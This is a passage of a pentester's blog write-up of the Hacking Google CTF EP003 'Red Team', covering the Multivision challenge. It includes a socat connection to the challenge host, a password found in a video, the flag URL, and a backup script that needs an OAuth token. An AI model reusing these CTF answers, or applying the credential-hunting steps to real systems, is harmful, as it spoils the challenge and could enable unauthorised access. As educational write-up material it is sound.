@@ -1,0 +1,1108 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My writeup for EP003 of the Hacking Google CTF : Red Team.">
+      
+      
+      
+        <link rel="canonical" href="https://www.techbrunch.fr/blog/hacking-google-ep003---red-team/">
+      
+      
+        <link rel="prev" href="../hacking-google-ep002---detection--response/">
+      
+      
+      
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.37">
+    
+    
+      
+        <title>Hacking Google EP003 - Red Team - Today I Learned</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.8c3ca2c6.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        
+        <link rel="stylesheet" href="../../assets/external/fonts.googleapis.com/css.49ea35f2.css">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Hacking Google EP003 - Red Team - Today I Learned" >
+      
+        <meta  property="og:description"  content="My writeup for EP003 of the Hacking Google CTF : Red Team." >
+      
+        <meta  property="og:image"  content="https://www.techbrunch.fr/assets/images/social/blog/posts/hacking-google-red-team.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="https://www.techbrunch.fr/blog/hacking-google-ep003---red-team/" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Hacking Google EP003 - Red Team - Today I Learned" >
+      
+        <meta  name="twitter:description"  content="My writeup for EP003 of the Hacking Google CTF : Red Team." >
+      
+        <meta  name="twitter:image"  content="https://www.techbrunch.fr/assets/images/social/blog/posts/hacking-google-red-team.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hacking-google-ep003-red-team" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+        <aside class="md-banner">
+          <div class="md-banner__inner md-grid md-typeset">
+            
+              <button class="md-banner__button md-icon" aria-label="Don't show this again">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              </button>
+            
+            
+  <a href="https://twitter.com/techbrunchfr">
+    For updates follow <strong>@techbrunchfr</strong> on
+    <span class="twemoji twitter">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
+    </span>
+    <strong>Twitter</strong>
+  </a>
+
+          </div>
+          
+            <script>var el=document.querySelector("[data-md-component=announce]");if(el){var content=el.querySelector(".md-typeset");__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0)}</script>
+          
+        </aside>
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Today I Learned" class="md-header__button md-logo" aria-label="Today I Learned" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Today I Learned
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Hacking Google EP003 - Red Team
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Today I Learned" class="md-nav__button md-logo" aria-label="Today I Learned" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Today I Learned
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href="../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Archive
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2022/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2022
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../archive/2020/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    2020
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Categories
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../category/writeup/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WriteUp
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-01-multivision" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge 01 - Multivision
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-02-shell-sprinter" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge 02 - Shell Sprinter
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#challenge-03-secucorgi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Challenge 03 - SecuCorgi
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+  <div class="md-content md-content--post" data-md-component="content">
+    <div class="md-sidebar md-sidebar--post" data-md-component="sidebar" data-md-type="navigation">
+      <div class="md-sidebar__scrollwrap">
+        <div class="md-sidebar__inner md-post">
+          <nav class="md-nav md-nav--primary">
+            <div class="md-post__back">
+              <div class="md-nav__title md-nav__container">
+                <a href="../" class="md-nav__link">
+                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+                  <span class="md-ellipsis">
+                    Back to index
+                  </span>
+                </a>
+              </div>
+            </div>
+            
+              <div class="md-post__authors md-typeset">
+                
+                  <div class="md-profile md-post__profile">
+                    <span class="md-author md-author--long">
+                      <img src="../../assets/external/github.com/Techbrunch.png.jpg" alt="Aloïs Thévenot">
+                    </span>
+                    <span class="md-profile__description">
+                      <strong>
+                        
+                          Aloïs Thévenot
+                        
+                      </strong>
+                      <br>
+                      Pentester
+                    </span>
+                  </div>
+                
+              </div>
+            
+            <ul class="md-post__meta md-nav__list">
+              <li class="md-nav__item md-nav__item--section">
+                <div class="md-post__title">
+                  <span class="md-ellipsis">
+                    Metadata
+                  </span>
+                </div>
+                <nav class="md-nav">
+                  <ul class="md-nav__list">
+                    <li class="md-nav__item">
+                      <div class="md-nav__link">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 19H5V8h14m-3-7v2H8V1H6v2H5c-1.11 0-2 .89-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2h-1V1m-1 11h-5v5h5z"/></svg>
+                        <time datetime="2022-10-20 00:00:00" class="md-ellipsis">October 20, 2022</time>
+                      </div>
+                    </li>
+                    
+                    
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 3v15h3V3zm3 2 4 13 3-1-4-13zM5 5v13h3V5zM3 19v2h18v-2z"/></svg>
+                          <span class="md-ellipsis">
+                            in
+                            
+                              <a href="../category/writeup/">WriteUp</a></span>
+                        </div>
+                      </li>
+                    
+                    
+                      
+                      <li class="md-nav__item">
+                        <div class="md-nav__link">
+                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8m0-18a10 10 0 0 1 10 10 10 10 0 0 1-10 10C6.47 22 2 17.5 2 12A10 10 0 0 1 12 2m.5 5v5.25l4.5 2.67-.75 1.23L11 13V7z"/></svg>
+                          <span class="md-ellipsis">
+                            
+                              9 min read
+                            
+                          </span>
+                        </div>
+                      </li>
+                    
+                  </ul>
+                </nav>
+              </li>
+            </ul>
+          </nav>
+          
+        </div>
+      </div>
+    </div>
+    <article class="md-content__inner md-typeset">
+      
+        
+  
+  
+
+<nav class="md-tags" >
+  
+    
+    
+    
+      <span class="md-tag">CTF</span>
+    
+  
+    
+    
+    
+      <span class="md-tag">Reversing</span>
+    
+  
+    
+    
+    
+      <span class="md-tag">Mobile</span>
+    
+  
+</nav>
+
+
+
+<h1 id="hacking-google-ep003-red-team">Hacking Google EP003 - Red Team<a class="headerlink" href="#hacking-google-ep003-red-team" title="Permanent link">&para;</a></h1>
+<p>My writeup for EP003 of the Hacking Google CTF : Red Team.</p>
+<!-- more -->
+
+<h3 id="challenge-01-multivision">Challenge 01 - Multivision<a class="headerlink" href="#challenge-01-multivision" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>To make sure things are safe, sometimes, you need someone to break them.</p>
+<p>Blink and you'll miss it (9:29). Blink and you'll miss it again (15:09).</p>
+<p>Can you hunt down the secret corporate documents? socat FILE:<code>tty</code>,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337</p>
+<p>Hint: Find the key, and put RFC 6749 to use</p>
+</blockquote>
+<p>If we try to connect we are asked for a password:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>== proof-of-work: disabled ==
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Password:
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>a
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>failed authentication :(
+</code></pre></div>
+<p>If we look closely at the <a href="https://www.youtube.com/watch?v=TusQWn2TQxQ">Episode 3</a> at <a href="https://www.youtube.com/watch?v=TusQWn2TQxQ&amp;t=569s">9:29</a> we can see the same login interface and at <a href="https://youtu.be/TusQWn2TQxQ?t=909">15:09</a> a password on a Swiss Army Knife: <code>WhoPutMyPasswordH3r3</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>❯ socat FILE:`tty`,raw,echo=0 TCP:multivision.h4ck.ctfcompetition.com:1337
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>== proof-of-work: disabled ==
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Password:
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>WhoPutMyPasswordH3r3
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>*** Congratulations! ***
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>*** https://h4ck1ng.google/solve/1_w0nd3r_wh47_53cr3t5_l13_h3r3 ***
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>developer@googlequanta.com:/home/developer$ ls
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>backup.py  login.sh  todo.txt
+</code></pre></div>
+<p>Once logged in we can see three files in our home directory. A backup script missing a token, a bash script used for the first part of this challenge and a text file mentionning a sensitive document probably containing our flag.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">backup.py</label><label for="__tabbed_1_2">login.sh</label><label for="__tabbed_1_3">todo.txt</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="sd">&quot;&quot;&quot;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="sd">[WIP]</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="sd">Regularly backup sensitive Google Drive files to disk</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="sd">&quot;&quot;&quot;</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="kn">import</span> <span class="nn">json</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="kn">import</span> <span class="nn">requests</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">doc_id</span> <span class="o">=</span> <span class="s2">&quot;1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM&quot;</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="k">def</span> <span class="nf">get_file</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">file_id</span><span class="p">):</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>        <span class="sa">f</span><span class="s1">&#39;https://docs.googleapis.com/v1/documents/</span><span class="si">{</span><span class="n">file_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Authorization&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Bearer </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">},</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>    <span class="p">)</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>    <span class="n">file_content</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Yikes!</span><span class="se">\n</span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>        <span class="n">file_content</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;body&#39;</span><span class="p">]</span>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>    <span class="k">return</span> <span class="n">file_content</span>
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="k">def</span> <span class="nf">get_token</span><span class="p">():</span>
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>    <span class="c1"># TODO: I know it&#39;ll work with a &#39;documents.readonly&#39; scope...</span>
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>    <span class="c1"># ...just need to get the access token</span>
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>    <span class="k">pass</span>
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="c1"># Backup file every hour</span>
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;backup.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">get_file</span><span class="p">(</span><span class="n">get_token</span><span class="p">(),</span> <span class="n">doc_id</span><span class="p">))</span>
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>    <span class="n">sleep</span><span class="p">(</span><span class="mi">3600</span><span class="p">)</span>
+</code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Password: &quot;</span>
